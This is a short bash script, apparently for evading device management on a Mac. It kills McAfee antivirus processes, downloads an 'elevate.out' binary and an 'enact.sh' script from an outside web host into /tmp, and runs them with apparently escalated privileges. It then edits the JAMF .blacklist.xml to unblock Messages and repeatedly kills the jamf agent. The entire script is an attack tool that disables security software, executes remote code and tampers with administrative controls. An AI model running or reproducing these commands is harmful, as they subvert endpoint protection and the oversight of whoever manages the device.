#!/bin/bash

pkill .*McAfee.*
killall Messages

curl -so /tmp/elevate.out https://erikboesen.com/dl/elevate.out
curl -so /tmp/enact.sh https://erikboesen.com/dl/enact.sh
chmod +x /tmp/elevate.out /tmp/enact.sh

/tmp/elevate.out <<EOF
/tmp/enact.sh &
sed -i -e 's/Messages/iMessage/g' /Library/Application\ Support/JAMF/.blacklist.xml
for i in {1..5}; do
    killall jamf
    sleep .3s
done
EOF

open /Applications/Messages.app

exit
